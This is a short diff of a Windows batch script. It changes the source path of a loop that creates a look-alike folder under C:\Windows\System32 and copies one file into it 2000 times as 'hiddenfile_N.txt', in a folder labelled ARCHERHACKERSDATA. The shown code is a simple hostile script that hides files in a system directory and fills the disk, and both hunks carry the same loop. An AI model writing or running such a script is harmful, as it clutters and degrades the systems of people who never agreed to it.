@@ -60,7 +60,7 @@ set /a cr=0
 mkdir C:\Windows\System32\config_
 
 :copy
-copy %userprofile%\Desktop\re.txt C:\Windows\System32\config_\hiddenfile_%cr%.txt
+copy %userprofile%\Desktop\ARCHERHACKERSDATA\re.txt C:\Windows\System32\config_\hiddenfile_%cr%.txt
 set /a cr=%cr%+1
 if not %cr%==2000 goto copy
 
@@ -83,7 +83,7 @@ set /a cr=0
 mkdir C:\Windows\System32\config_
 
 :copy
-copy %userprofile%\Desktop\re.txt C:\Windows\System32\config_\hiddenfile_%cr%.txt
+copy %userprofile%\Desktop\ARCHERHACKERSDATA\re.txt C:\Windows\System32\config_\hiddenfile_%cr%.txt
 set /a cr=%cr%+1
 if not %cr%==2000 goto copy
 
